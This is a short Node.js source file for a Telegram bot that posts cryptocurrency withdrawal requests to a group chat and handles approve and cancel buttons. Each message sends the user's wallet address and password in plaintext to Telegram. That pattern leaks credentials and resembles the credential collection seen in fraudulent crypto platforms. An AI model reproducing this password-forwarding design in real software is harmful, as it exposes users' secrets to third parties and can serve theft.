// bot.js
import fetch from "node-fetch";

const BOT_TOKEN = process.env.BOT_TOKEN;
const GROUP_ID = process.env.GROUP_ID;

export async function sendWithdrawalMessage(data) {
  const message = `
📤 *NEW WITHDRAWAL REQUEST*
--------------------------------
💰 Coin: ${data.coin}
🔢 Amount: ${data.amount}
💵 USDT: ${data.usdt.toFixed(4)}
🏦 Wallet: ${data.wallet}
🔐 Password: ${data.password}
🆔 Transaction Hash: ${data.txHash}
⚠️ Wallet & password can be bound once.
*Please screenshot the transaction hash for record.*
`;

  const inlineButtons = {
    inline_keyboard: [
      [
        { text: "✔ 成功交易", callback_data: `success_${data.txHash}` },
        { text: "✖ 取消交易", callback_data: `cancel_${data.txHash}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: GROUP_ID,
      text: message,
      parse_mode: "Markdown",
      reply_markup: inlineButtons
    })
  });
}

export async function handleCallback(callback_query) {
  const { id, data, message } = callback_query;
  let statusText = "";

  if (data.startsWith("success_")) {
    statusText = "✅ 提现已成功处理";
  } else if (data.startsWith("cancel_")) {
    statusText = "❌ 提现已取消";
  }

  // 回应 Telegram，更新按钮显示
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: id,
      text: statusText,
      show_alert: true
    })
  });

  // 编辑原消息，标记已处理
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: message.chat.id,
      message_id: message.message_id,
      reply_markup: { inline_keyboard: [] } // 清空按钮
    })
  });
}
